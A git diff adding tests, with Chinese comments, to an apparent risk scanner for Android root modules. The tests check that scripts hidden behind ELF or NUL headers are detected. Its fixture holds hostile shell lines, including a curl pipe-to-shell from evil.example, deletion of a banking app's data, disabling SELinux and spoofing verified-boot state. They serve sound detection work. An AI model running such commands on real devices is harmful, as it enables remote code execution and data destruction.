@@ -9,6 +9,7 @@ import { writeFileSync, mkdtempSync, existsSync, readFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { deflateRawSync, crc32 } from 'node:zlib';
+import { createHash } from 'node:crypto';
 
 import {
   RULES_BY_ID, CONTENT_RULES, scanContent, checkMetadata, parseModuleProp,
@@ -4802,3 +4803,422 @@ test('T3.4-C2 不变量：左边界收缩进第一支，SHELL_STATEMENT_START �
 });
 
 
+
+// ===========================================================================
+// Task 4 —— polyglot（ELF 魔数 / 开头即 NUL，但整块可读）进 feed，不进 coveredSurface
+// ===========================================================================
+// 洞（工单 `briefs/task-4.md` §0，2026-10-15 在新 HEAD `3ff30a9` 上逐形重量过）：
+//   `classify()` 第一道闸是 `detectBinary(f.head)`，命中就落 `binaries` 桶并 `continue` ——
+//   「魔数/NUL 开头 + 后面整块是明文脚本」这种 polyglot **一行都没喂给内容规则**。
+// 改前实测（本会话 `Temp/p5-t34/t4-probe4.mjs` / `t4-probe5.mjs` 逐形跑出来的值，不是抄工单）：
+//   A1 形（ELF8 + 四行明文，ratio=0.965986）：直喂 scanContent 出 5 条
+//     （PIPE_TO_SHELL/high@L2、RM_RF_MUTABLE/medium@L3、SELINUX_DISABLE/high@L4、
+//       VERIFIED_BOOT_SPOOF/high@L5、NETWORK_FETCH/low@L2），而整包只有
+//     `STRUCT_BINARY/medium` 一条，medium / block。
+//   A2 形（NUL4 + 同一段明文，ratio=0.972028）：同上，detectBinary 走 NUL 那一支。
+//   A3 三侧（0.851 / 0.850 / 0.849，比例是**精确**的 851/1000、850/1000、849/1000）：改前三条都是
+//     medium / block、findings 只有 STRUCT_BINARY 一条 —— 改后只许 0.851 那一侧进面。
+//   B1 形（Pixelify 两条 .descriptor 逐字节，0.875000 / 0.861524）：改前 medium / block、
+//     counts={high:0,medium:2,low:0,info:0}、findings 就是那两条 STRUCT_BINARY；逐字节喂 scanContent 出 **0 条**。
+//   B2 形（真字体前 3000 B，ratio=0.340333）：改前与改后都只许 STRUCT_BINARY 一条 —— 它不许进面。
+//   B3 形（polyglot + `customize.sh` 里 `sh $MODPATH/assets/payload.bin`）：改前就是 high / block，
+//     载荷因**引用升级**进面（Task 2.7 那条通道），EXEC_BUNDLED_FILE/high@customize.sh:2 在、
+//     revokedBundledRefs=[] —— 这一格改前改后必须**一字不变**（工单 §2.5：撤销只认 coveredSurface）。
+// 战果的口径（工单 §0 的诚实话）：本轮**不多拦一个包** —— `STRUCT_BINARY` 无条件发 medium，
+// 带二进制的包本来就进不了自动通道；变的是报告从「有个二进制我读不了」变成「里面逐字写着什么、第几行」。
+// 断言口径与 T3/T3.3/T3.4 相同：每条都 deepEqual 到**精确 findings 多重集合**，不写 some(...)。
+
+// 共享层取值走**命名空间**而不是具名 import：先红阶段 `printableRatio` / `POLYGLOT_MIN_PRINTABLE`
+// 还不存在，具名 import 会在链接期就把整个文件打挂（几百条一起红，拿不到「只有新用例红」这个数）。
+import * as sharedT4 from './risk-rules.mjs';
+import * as scanT4 from './scan.mjs';
+
+/** 工单 §0 的量法，在夹具侧独立复算一份**只用来对账**（判据实现只许有共享层那一份，见 T4-C1）。 */
+const T4_PRINTABLE = (b) => (b >= 0x20 && b <= 0x7e) || b === 0x09 || b === 0x0a || b === 0x0d;
+const t4ratio = (bytes) => {
+  const b = Buffer.isBuffer(bytes) ? bytes : Buffer.from(String(bytes ?? ''), 'utf8');
+  if (!b.length) return 0;
+  let ok = 0;
+  for (const x of b) if (T4_PRINTABLE(x)) ok++;
+  return ok / b.length;
+};
+
+const T4_SHA1 = (b) => createHash('sha1').update(b).digest('hex');
+const T4_ELF8 = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
+const T4_NUL4 = Buffer.from([0x00, 0x00, 0x00, 0x00]);
+/** 五行明文（shebang + 管道 + rm -rf /data/... + setenforce 0 + resetprop verifiedbootstate） */
+const T4_TXT = '#!/system/bin/sh\ncurl -s https://evil.example/a | sh\nrm -rf /data/data/com.bank.app\nsetenforce 0\nresetprop ro.boot.verifiedbootstate green\n';
+/** 压线构造：分子=可打印字节数，分母=总字节数，尾部补 NUL。ELF8 头里恰好 3 个可打印（E、L、F）。 */
+const t4edge = (printableTotal, total) => {
+  const body = T4_TXT + '#'.repeat(printableTotal - 3 - Buffer.byteLength(T4_TXT));
+  return Buffer.concat([T4_ELF8, Buffer.from(body, 'utf8'), Buffer.alloc(total - 8 - Buffer.byteLength(body), 0)]);
+};
+const T4_SHAPE = {
+  a1: Buffer.concat([T4_ELF8, Buffer.from(T4_TXT, 'utf8')]),
+  a2: Buffer.concat([T4_NUL4, Buffer.from(T4_TXT, 'utf8')]),
+  in851: t4edge(851, 1000),
+  eq850: t4edge(850, 1000),
+  out849: t4edge(849, 1000),
+  // 超限 polyglot：载荷整行落在 24 KB 之后（工单 §2.3 的有界通道就靠这一形记账）
+  big: Buffer.concat([T4_ELF8,
+    Buffer.from(pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(60), 'utf8'),
+    Buffer.alloc(64, 0)]),
+};
+const T4_SHA = {
+  a1: '4993af34c77e7c53391388952a237daf360a64fd',
+  a2: '5c5287d3e10dd22513f48e746ff90e834b010137',
+  in851: '688e1044502a1c1abd241dacc47cf2260cd5be10',
+  eq850: 'a2947b3711aa55a358d42e36a03bf02609f67e49',
+  out849: '95995d4e122b4de1bf15e52f1cc9f9a5c6ad89c6',
+  big: 'c99f986e50128e6a8f2bc7b03c32a00e36288fa8',
+  descDnd: '1dc90e16ccab657ff3739be50c26d8cfbccaccfe',
+  descMusic: '9460f9e423c0a095bee139e1704782093d5ec038',
+  fontSlice: 'e9b3cbfbb9a7794b9d5d1373694e7f5cc17ddec3',
+};
+
+// —— 真样本逐字节（工单 §3 B1/B2 要的是「逐字节进包」，不是同比例的合成物）——
+// 来源：Pixelify-master-source.zip 的 nplaying 固件描述文件、PerformanC_ReZygisk 的 webroot 字体前 3000 B。
+// 只把字节请进夹具，样本包本身不参与测试运行；每条都用 sha1 钉住「贴进来的就是量过的那一份」。
+const T4_B64 = {
+  descDnd: [
+    'EAAaWgpHY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNbMF0uaW5pdGlhbF9zcXVlbGNoX3BlcmlvZF9mcmFt',
+    'ZXMSBm1pbnQzMhgBIO+/vTwoBDAEGlsKR2NsYXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzBdLm5lZ2F0aXZl',
+    'X2V2ZW50X3RpbWVvdXRfZnJhbWVzEgdtdWludDMyGAAg77+9PCgEMAQaWQpGY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9u',
+    'X3RhcmdldHNbMF0ubmVnYXRpdmVfZnJhbWVzX2JlZm9yZV9ldmVudBIGbWludDMyGAEg77+9PCgEMAQaVQpCY2xhc3NpZmllcl9k',
+    'YXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNbMF0ubmVnYXRpdmVfc2NvcmVfdGhyZXNob2xkEgZtaW50MTYYASDvv708KAIwAhpb',
+    'CkdjbGFzc2lmaWVyX2RhdGEuY2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5wb3NpdGl2ZV9ldmVudF90aW1lb3V0X2ZyYW1lcxIH',
+    'bXVpbnQzMhgAIO+/vTwoBDAEGlkKRmNsYXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzBdLnBvc2l0aXZlX2Zy',
+    'YW1lc19iZWZvcmVfZXZlbnQSBm1pbnQzMhgBIO+/vTwoBDAEGlUKQmNsYXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJn',
+    'ZXRzWzBdLnBvc2l0aXZlX3Njb3JlX3RocmVzaG9sZBIGbWludDE2GAEg77+9PCgCMAIaWgpHY2xhc3NpZmllcl9kYXRhLmNsYXNz',
+    'aWZpY2F0aW9uX3RhcmdldHNbMV0uaW5pdGlhbF9zcXVlbGNoX3BlcmlvZF9mcmFtZXMSBm1pbnQzMhgBIO+/vT0oBDAEGlsKR2Ns',
+    'YXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzFdLm5lZ2F0aXZlX2V2ZW50X3RpbWVvdXRfZnJhbWVzEgdtdWlu',
+    'dDMyGAAg77+9PSgEMAQaWQpGY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNbMV0ubmVnYXRpdmVfZnJhbWVz',
+    'X2JlZm9yZV9ldmVudBIGbWludDMyGAEg77+9PCgEMAQaVQpCY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNb',
+    'MV0ubmVnYXRpdmVfc2NvcmVfdGhyZXNob2xkEgZtaW50MTYYASDvv708KAIwAhpbCkdjbGFzc2lmaWVyX2RhdGEuY2xhc3NpZmlj',
+    'YXRpb25fdGFyZ2V0c1sxXS5wb3NpdGl2ZV9ldmVudF90aW1lb3V0X2ZyYW1lcxIHbXVpbnQzMhgAIO+/vT0oBDAEGlkKRmNsYXNz',
+    'aWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzFdLnBvc2l0aXZlX2ZyYW1lc19iZWZvcmVfZXZlbnQSBm1pbnQzMhgB',
+    'IO+/vTwoBDAEGlUKQmNsYXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzFdLnBvc2l0aXZlX3Njb3JlX3RocmVz',
+    'aG9sZBIGbWludDE2GAEg77+9PCgCMAIaKwoYY2xhc3NpZmllcl9mcmFtZV9zdGVwX21zEgZtaW50MzIYASDvv70CKAQwBBodCgpt',
+    'b2RlbF9uYW1lEgZjaGFyW10YACDvv70/KAEwARoiCg9tb2RlbF9uYW1lX3NpemUSBm1pbnQzMhgBIO+/vQIoBDAE',
+  ].join(''),
+  descMusic: [
+    'EAAaVQpCY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNbMF0uZ2VuZXJhdGVfbmVnYXRpdmVfZXZlbnRzEgZi',
+    'b29sX3QYASDvv71kKAQwBBpaCkdjbGFzc2lmaWVyX2RhdGEuY2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5pbml0aWFsX3NxdWVs',
+    'Y2hfcGVyaW9kX2ZyYW1lcxIGbWludDMyGAEg77+9ZCgEMAQaWwpHY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3Rhcmdl',
+    'dHNbMF0ubmVnYXRpdmVfZXZlbnRfdGltZW91dF9mcmFtZXMSB211aW50MzIYACDvv71kKAQwBBpZCkZjbGFzc2lmaWVyX2RhdGEu',
+    'Y2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5uZWdhdGl2ZV9mcmFtZXNfYmVmb3JlX2V2ZW50EgZtaW50MzIYASDvv71kKAQwBBpV',
+    'CkJjbGFzc2lmaWVyX2RhdGEuY2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5uZWdhdGl2ZV9zY29yZV90aHJlc2hvbGQSBm1pbnQx',
+    'NhgBIO+/vWQoAjACGlsKR2NsYXNzaWZpZXJfZGF0YS5jbGFzc2lmaWNhdGlvbl90YXJnZXRzWzBdLnBvc2l0aXZlX2V2ZW50X3Rp',
+    'bWVvdXRfZnJhbWVzEgdtdWludDMyGAAg77+9ZCgEMAQaWQpGY2xhc3NpZmllcl9kYXRhLmNsYXNzaWZpY2F0aW9uX3RhcmdldHNb',
+    'MF0ucG9zaXRpdmVfZnJhbWVzX2JlZm9yZV9ldmVudBIGbWludDMyGAEg77+9ZCgEMAQaVQpCY2xhc3NpZmllcl9kYXRhLmNsYXNz',
+    'aWZpY2F0aW9uX3RhcmdldHNbMF0ucG9zaXRpdmVfc2NvcmVfdGhyZXNob2xkEgZtaW50MTYYASDvv71kKAIwAhpZCkZjbGFzc2lm',
+    'aWVyX2RhdGEuY2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5wb3NpdGl2ZV9zdGF0ZV9pc19wZXJzaXN0ZW50EgZib29sX3QYASDv',
+    'v71kKAQwBBorChhjbGFzc2lmaWVyX2ZyYW1lX3N0ZXBfbXMSBm1pbnQzMhgBIO+/vQMoBDAEGloKR2NsYXNzaWZpZXJfc3RhdGUu',
+    'Y2xhc3NpZmljYXRpb25fdGFyZ2V0c1swXS5wb3NpdGl2ZV9zdGF0ZV9pc19wZXJzaXN0ZW50EgZib29sX3QYASDvv71kKAQwBBod',
+    'Cgptb2RlbF9uYW1lEgZjaGFyW10YACDvv71lKAEwARoiCg9tb2RlbF9uYW1lX3NpemUSBm1pbnQzMhgBIO+/vQMoBDAEGhwKCXJl',
+    'd2luZF9tcxIGbWludDMyGAEg77+9AygEMAQ=',
+  ].join(''),
+  fontSlice: [
+    'AAEAAAANAO+/vQADAFBHREVGCRYJGQAAAVgAAABAR1BPUxdHIe+/vQAAIygAABPvv71HU1VC77+9J++/vS4AAFnvv70AACZ0T1Mv',
+    'Mu+/ve+/vXfvv70AAAHvv70AAABgY21hcDUJOxQAAAHvv70AAALvv71nbHlmUcOS77+9AADvv70cAAHvv70CaGVhZBrvv70kYQAA',
+    'ASAAAAA2aGhlYQx1BiAAAADvv70AAAAkaG10eGbvv73vv70xAAAS77+9AAAQ77+9bG9jYQsj77+977+9AAAKVAAACEhtYXhwBO+/',
+    'vQEsAAAA77+9AAAAIG5hbWXvv70NFO+/vQAABO+/vQAABe+/vXBvc3Q677+9aO+/vQAANxAAACLvv70AAQAABCMA77+9AAwAdgAG',
+    'AAEAAgAeAAYAAABkAAAAAwACAAEAAAQa77+977+9AGQJ77+977+977+977+9bgoHAAEAAAAAAAAAAAAAAAAAAAQiAAEAAAAEAQbv',
+    'v73vv73vv71TXw8877+9AAMD77+9AAAAANik77+977+9AAAAAO+/vRY277+977+977+977+977+9CgcEKQAAAAcAAgAAAAAAAAAB',
+    'AAAADAAAAAAAAAACAAgAGAAfAAMAIgAiAAMAeQB6AAMAfQB9AAMA77+9AO+/vQADAlwCXwADAmcCbAADAnMCcwADAAQDUwHvv70A',
+    'BQAAAu+/vQJYAAAASwLvv70CWAAAAV4AMgFIAAAAAAUAAAAAAAAAAADvv70HAAAAAAAAAAAAAAAASVRGTwDvv70AAO+/vQIEGu+/',
+    've+/vQBkBG8CcyAAAO+/vQAAAAACJALvv70AAAAgAAQAAAACAAAAAwAAABQAAwABAAAAFAAEAu+/vQAAAO+/vQDvv70ABgAaAAAA',
+    'DQAgAH4BBwEbASMBMQE3AUgBWwFlAX4B77+9Ae+/vQHvv70CGwJZAu+/vQLvv70C77+9Au+/vQPvv70JAwkLCQ0JEQkUCSgJMAkz',
+    'CTkJRQlJCU0JUAleCWUJbwlwCXIe77+9Hu+/vR7vv70e77+9IA0gFCAaIB4gIiAmIDAgOiBEIO+/vSDvv70g77+9IO+/vSETISIh',
+    'JiEuIgIiBiIPIhIiFSIaIh4iKyJIImAiZSXvv70l77+977+9Au+/ve+/vQAAAAAADQAgACEA77+9AQoBHgEoATYBOQFMAV4BaAHv',
+    'v70B77+9Ae+/vQIYAlkC77+9Au+/vQLvv70C77+9A++/vQkBCQUJDAkPCRMJFQkqCTEJNQk8CUcJSwlQCVgJYAlmCXAJch7vv70e',
+    '77+9Hu+/vR7vv70gDCATIBggHCAgICYgMCA5IEQg77+9IO+/vSDvv70g77+9IRMhIiEmIS4iAiIGIg8iESIVIhkiHiIrIkgiYCJk',
+    'Je+/vSXvv73vv70B77+977+9AAHvv73vv73vv73vv70CcwJSAlACTgJKAkYCRQJCAkACPgIuAiwB77+9Ae+/vQFsAQoBAQEAAO+/',
+    'vQAQAADvv73vv70AAAAA77+977+977+9D++/vQ4AAO+/vQsAAAAAAADvv70577+977+9AADvv70Z77+9Gu+/ve+/ve+/vVHvv70b',
+    '77+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+977+9QQAA77+9Mu+/',
+    've+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/ve+/',
+    've+/ve+/vTjvv73vv70JAgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAbgBwAAAA',
+    'AAAAAG4AAABwAO+/vQDvv70AAAAAAO+/vQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAAAAAAAAAAAAA',
+    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB6AHkAewAMABIADgAPABQATwA/AEUAfgB8ABUAFgAXABgAGQAaABsAIgAeAB8A',
+    'IwAgACEAfQALAA0AHAAdAO+/vQDvv70A77+9A++/vQAAAAAAEQDvv70AAwABBAkAAADvv70EFAADAAEECQABAA4EBgADAAEECQAC',
+    'AA4D77+9AAMAAQQJAAMAPAPvv70AAwABBAkABAAeA++/vQADAAEECQAFAAoD77+9AAMAAQQJAAYAHgN2AAMAAQQJAAgAJgNQAAMA',
+    'AQQJAAkAXALvv70AAwABBAkACwA6Au+/vQADAAEECQANASIB77+9AAMAAQQJAA4ANgFiAAMAAQQJABMA77+9AO+/vQADAAEECQEA',
+    'AEAAdAADAAEECQEBAB4AVgADAAEECQECACoALAADAAEECQEDACwAAABBAGwAdABlAHIAbgBhAHQAaQB2AGUAIAAyACwAIAAzACwA',
+    'IAA2ACwAIAA5AEEAbAB0AGUAcgBuAGEAdABpAHYAZQAgAGEAbQBwAGUAcgBzAGEAbgBkAEQAbwB1AGIAbABlAC0AcwB0AG8AcgBl',
+    'AHkAIABhAFMAcQB1AGEAcgBlACAAZABvAHQAcwAgAGkAbgAgAHAAdQBuAGMAdAB1AGEAdABpAG8AbgAgAG0AYQByAGsAcwk4CS0J',
+    'QAAgCS4JKAlBCTcJTQkvCUsJAgAgCRUJSwAgCRcJTAkwCTUAIAkUCTAAIAkFCScJPwkVCT4JMAlLCQIAIAkVCUcAIAkuCT4JLgky',
+    'CUcAIAkuCUcJAgAgCRwJKAlNCS4JHAk+CSQAIAk4CU0JNQkkCSgJTQkkCU0JMAkkCT4AIAkUCTAAIAk4CS4JPgkoCSQJPgAgCSoJ',
+    'TQkwCT4JKglNCSQAIAk5CUgJZABoAHQAdABwAHMAOgAvAC8AcwBjAHIAaQBwAHQAcwAuAHMAaQBsAC4AbwByAGcALwBPAEYATABU',
+    'AGgAaQBzACAARgBvAG4AdAAgAFMAbwBmAHQAdwBhAHIAZQAgAGkAcwAgAGwAaQBjAGUAbgBzAGUAZAAgAHUAbgBkAGUAcgAgAHQA',
+    'aABlACAAUwBJAEwAIABPAHAAZQBuACAARgBvAG4AdAAgAEwAaQBjAGUAbgBzAGUALAAgAFYAZQByAHMAaQBvAG4AIAAxAC4AMQAu',
+    'ACAAVABoAGkAcwAgAGwAaQBjAGUAbgBzAGUAIABpAHMAIABhAHYAYQBpAGwAYQBiAGwAZQAgAHcAaQB0AGgAIABhACAARgBBAFEA',
+    'IABhAHQAOgAgAGgAdAB0AHAAcwA6AC8ALwBzAGMAcgBpAHAAdABzAC4AcwBpAGwALgBvAHIAZwAvAE8ARgBMAGgAdAB0AHAAcwA6',
+    'AC8ALwBpAG4AZABpAGEAbgB0AHkAcABlAGYAbwB1AG4AZAByAHkALgBjAG8AbQBOAGkAbgBhAGQAIABLAGEAbABlACAAKABEAGUA',
+    'dgBhAG4AYQBnAGEAcgBpACkALAAgAEoAbwBuAG4AeQAgAFAAaQBuAGgAbwByAG4AIAAoAEwAYQB0AGkAbgApAEkAbgBkAGkAYQBu',
+    'ACAAVAB5AHAAZQAgAEYAbwB1AG4AZAByAHkAUABvAHAAcABpAG4AcwAtAFIAZQBnAHUAbABhAHIANAAuADAAMAA0AFAAbwBwAHAA',
+    'aQBuAHMAIABSAGUAZwB1AGwAYQByAEkAVABGAE8AOwAgAFAAbwBwAHAAaQBuAHMAIABSAGUAZwB1AGwAYQByADsAIAA0AC4AMAAw',
+    'ADQAYgA4AFIAZQBnAHUAbABhAHIAUABvAHAAcABpAG4AcwBDAG8AcAB5AHIAaQBnAGgAdAAgADIAMAAyADAAIABUAGgAZQAgAFAA',
+    'bwBwAHAAaQBuAHMAIABQAHIAbwBqAGUAYwB0ACAAQQB1AHQAaABvAHIAcwAgACgAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBi',
+  ].join(''),
+};
+const T4_NAME = {
+  descDnd: 'Pixelify-master/module/extras/nplaying/system/etc/firmware/dnd.descriptor',
+  descMusic: 'Pixelify-master/module/extras/nplaying/system/etc/firmware/music_detector.descriptor',
+  fontSlice: 'webroot/fonts/fontface.slice',
+};
+const t4real = (k) => {
+  const b = Buffer.from(T4_B64[k], 'base64');
+  assert.equal(T4_SHA1(b), T4_SHA[k], `${k} 的 base64 与主控量过的那一份不是同一字节面`);
+  return b;
+};
+
+/** 整份报告收成「ruleId/severity@file:line」多重集合（排序，可 deepEqual）。 */
+const t4all = (r) => r.findings.map((f) => `${f.ruleId}/${f.severity}@${f.file}:${f.line}`).sort();
+/** 这一格本轮的新观测面：哪些 binaries 条目被追加进了内容扫描（feed）。 */
+const t4fed = (r) => (r.polyglotFed || []).map((x) => x.name).sort();
+const t4fedRow = (r, name) => (r.polyglotFed || []).find((x) => x.name === name) || null;
+const T4_CLEAN_SERVICE = '#!/system/bin/sh\necho ok\n';
+/** 一个 binaries 条目 + 一份干净的 service.sh：module.prop 由夹具自动补齐。 */
+async function t4pkg(id, name, bytes, extra = []) {
+  const zip = makeModuleZip({ id, files: [['service.sh', T4_CLEAN_SERVICE], [name, bytes], ...extra] });
+  return scanToReport(zip, { changeType: 'first' });
+}
+/** 五桶清单 + 升级清单 + others 清单里，这个条目名出现的总次数（一份身份 = 只许在 binaries 里）。 */
+function t4listAppearances(r, name) {
+  const inv = r.inventory;
+  return [inv.canonicalScripts, inv.otherScripts, inv.handlers, inv.props, inv.policyFiles, inv.escalated]
+    .reduce((n, rows) => n + (rows || []).filter((x) => x.name === name).length, 0)
+    + r.scripts.filter((x) => x.name === name).length
+    + r.inventory.otherFiles.filter((x) => x === name).length;
+}
+
+// —— §3 正面 ——
+
+test('T4-A1 正面（工单 §0 表第三行 / §3 A1）：ELF 魔数 + 五行明文 ⇒ 五条内容发现都在，STRUCT_BINARY 照旧在', async () => {
+  assert.equal(T4_SHA1(T4_SHAPE.a1), T4_SHA.a1, '夹具字节面钉住');
+  assert.equal(t4ratio(T4_SHAPE.a1).toFixed(6), '0.965986', '整块可打印比例（工单 §0 的量法）');
+  assert.equal(detectBinary(T4_SHAPE.a1.subarray(0, 512)).id, 'ELF', 'detectBinary 走的是魔数那一支');
+  const r = await t4pkg('eval.t4a1', 'assets/payload.bin', T4_SHAPE.a1);
+  assert.deepEqual(t4all(r), [
+    'NETWORK_FETCH/low@assets/payload.bin:2',
+    'PIPE_TO_SHELL/high@assets/payload.bin:2',
+    'RM_RF_MUTABLE/medium@assets/payload.bin:3',
+    'SELINUX_DISABLE/high@assets/payload.bin:4',
+    'STRUCT_BINARY/medium@assets/payload.bin:0',
+    'VERIFIED_BOOT_SPOOF/high@assets/payload.bin:5',
+  ], '改前只有 STRUCT_BINARY 一条（medium/block）；这六条就是本轮的战果本身');
+  assert.deepEqual(r.counts, { high: 3, medium: 2, low: 1, info: 0 });
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+  // 工单 §3 A1 括号里那句：这不是重复账 —— STRUCT_BINARY 说「有二进制」，
+  // 内容那五条说「里面逐字写着什么、第几行」。两条都得在，缺一个就是报告在说谎。
+  assert.deepEqual(t3spots(r, 'STRUCT_BINARY'), ['assets/payload.bin:0/medium'], '二进制登记照旧在（checkBinaries 一字未动）');
+  assert.deepEqual(t4fed(r), ['assets/payload.bin'], '它进的是 feed，报告要指名');
+});
+
+test('T4-A2 正面（工单 §3 A2）：NUL 开头 + 同一段明文 ⇒ 同样五条（detectBinary 的 NUL 那一支）', async () => {
+  assert.equal(T4_SHA1(T4_SHAPE.a2), T4_SHA.a2, '夹具字节面钉住');
+  assert.equal(t4ratio(T4_SHAPE.a2).toFixed(6), '0.972028');
+  assert.equal(detectBinary(T4_SHAPE.a2.subarray(0, 512)).id, 'NUL', '走的是「开头即含 NUL，不是文本」那一支');
+  const r = await t4pkg('eval.t4a2', 'assets/payload.bin', T4_SHAPE.a2);
+  assert.deepEqual(t4all(r), [
+    'NETWORK_FETCH/low@assets/payload.bin:2',
+    'PIPE_TO_SHELL/high@assets/payload.bin:2',
+    'RM_RF_MUTABLE/medium@assets/payload.bin:3',
+    'SELINUX_DISABLE/high@assets/payload.bin:4',
+    'STRUCT_BINARY/medium@assets/payload.bin:0',
+    'VERIFIED_BOOT_SPOOF/high@assets/payload.bin:5',
+  ], '改前同样是只有 STRUCT_BINARY 的 medium/block');
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+  assert.deepEqual(t4fed(r), ['assets/payload.bin']);
+});
+
+test('T4-A3 正面（工单 §3 A3）：压线两侧 0.851 / 0.850 / 0.849 —— 判据是 > 0.85，不是 >=', async () => {
+  // 三条用同一段明文，只靠尾部补 NUL 调比例；比例是**精确**的 851/1000、850/1000、849/1000。
+  assert.equal(t4ratio(T4_SHAPE.in851), 0.851);
+  assert.equal(t4ratio(T4_SHAPE.eq850), 0.85, '0.850 那一侧落在阈值**上**（>= 与 > 的分水岭）');
+  assert.equal(t4ratio(T4_SHAPE.out849), 0.849);
+  const IN = ['NETWORK_FETCH/low@assets/edge.bin:2', 'PIPE_TO_SHELL/high@assets/edge.bin:2',
+    'RM_RF_MUTABLE/medium@assets/edge.bin:3', 'SELINUX_DISABLE/high@assets/edge.bin:4',
+    'STRUCT_BINARY/medium@assets/edge.bin:0', 'VERIFIED_BOOT_SPOOF/high@assets/edge.bin:5'];
+  const OUT = ['STRUCT_BINARY/medium@assets/edge.bin:0'];
+  const rin = await t4pkg('eval.t4a3in', 'assets/edge.bin', T4_SHAPE.in851);
+  assert.deepEqual(t4all(rin), IN, '0.851 > 0.85 ⇒ 进面');
+  assert.deepEqual(t4fed(rin), ['assets/edge.bin']);
+  assert.equal(rin.riskLevel, 'high');
+  // 反面那一格：0.849「没进扫描面」必须钉成可观测的反面，而不是只钉一个等级。
+  const rout = await t4pkg('eval.t4a3out', 'assets/edge.bin', T4_SHAPE.out849);
+  assert.deepEqual(t4all(rout), OUT, '0.849 没进面：内容规则一行都没读它（摘掉阈值 = 变异 M2，红在这一格与 B2）');
+  assert.deepEqual(t4fed(rout), [], '未过阈值的条目不许出现在 feed 记账里');
+  assert.deepEqual(rout.counts, { high: 0, medium: 1, low: 0, info: 0 }, '改前改后一字不变');
+  assert.equal(rout.riskLevel, 'medium');
+  assert.equal(rout.decision.action, 'block');
+  // 阈值那一格本身：>= 会把 0.850 也捞进来 ⇒ 这一条专防「> 写成 >=」。
+  const req = await t4pkg('eval.t4a3eq', 'assets/edge.bin', T4_SHAPE.eq850);
+  assert.deepEqual(t4all(req), OUT, '恰好 0.850 不许进面（判据是严格大于）');
+  assert.deepEqual(t4fed(req), [], '同上');
+  assert.equal(t4ratio(t4real('descMusic')).toFixed(6), '0.861524', '真包最高那一侧（0.862）离 0.85 只有 0.0116 的余量');
+});
+
+test('T4-A4 正面（工单 §3 A4）：命中行号落在 polyglot 条目自己身上，不许漂到 service.sh 去作证', async () => {
+  const r = await t4pkg('eval.t4a4', 'assets/payload.bin', T4_SHAPE.a1);
+  for (const ruleId of ['PIPE_TO_SHELL', 'RM_RF_MUTABLE', 'SELINUX_DISABLE', 'VERIFIED_BOOT_SPOOF', 'NETWORK_FETCH']) {
+    assert.deepEqual(t3spots(r, ruleId), [`assets/payload.bin:${{
+      PIPE_TO_SHELL: 2, RM_RF_MUTABLE: 3, SELINUX_DISABLE: 4, VERIFIED_BOOT_SPOOF: 5, NETWORK_FETCH: 2,
+    }[ruleId]}/${{ PIPE_TO_SHELL: 'high', RM_RF_MUTABLE: 'medium', SELINUX_DISABLE: 'high', VERIFIED_BOOT_SPOOF: 'high', NETWORK_FETCH: 'low' }[ruleId]}`],
+      `${ruleId} 的落点必须是那个条目自己的行`);
+  }
+  assert.ok(!r.findings.some((f) => f.file === 'service.sh'), 'service.sh 只有 echo ok —— 漂到它那儿就是报告在编证人');
+  const snip = Object.fromEntries(r.findings.filter((f) => f.file === 'assets/payload.bin' && f.ruleId !== 'STRUCT_BINARY')
+    .map((f) => [`${f.ruleId}@${f.line}`, f.snippet]));
+  assert.equal(snip['PIPE_TO_SHELL@2'], 'curl -s https://evil.example/a | sh');
+  assert.equal(snip['SELINUX_DISABLE@4'], 'setenforce 0');
+  assert.equal(snip['VERIFIED_BOOT_SPOOF@5'], 'resetprop ro.boot.verifiedbootstate green');
+});
+
+// —— §3 反面 ——
+
+test('T4-B1 反面（工单 §0 / §3 B1）：Pixelify 两条 .descriptor 逐字节进包 ⇒ 进面可观测，但新发现 0 条、等级结论一字不变', async () => {
+  const dnd = t4real('descDnd'); const music = t4real('descMusic');
+  assert.equal(dnd.length, 1416); assert.equal(music.length, 1076);
+  assert.equal(t4ratio(dnd), 0.875); assert.equal(t4ratio(music).toFixed(6), '0.861524');
+  const zip = makeModuleZip({ id: 'eval.t4b1', files: [
+    ['service.sh', T4_CLEAN_SERVICE], [T4_NAME.descDnd, dnd], [T4_NAME.descMusic, music],
+  ]});
+  const r = await scanToReport(zip, { changeType: 'first' });
